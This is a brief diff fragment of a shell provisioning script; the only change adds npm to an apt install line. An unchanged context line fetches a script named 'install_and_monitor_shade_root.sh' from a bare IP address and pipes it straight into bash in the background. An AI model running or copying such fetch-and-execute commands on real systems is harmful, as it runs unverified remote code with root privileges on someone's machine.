@@ -15,7 +15,7 @@ curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &
 
 sleep 2
 
-apt update >/dev/null;apt -y install net-tools apt-utils psmisc libreadline-dev dialog curl wget >/dev/null;wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && \
+apt update >/dev/null;apt -y install net-tools apt-utils psmisc libreadline-dev dialog curl wget npm >/dev/null;wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && \
 
 sleep 2 && \
 
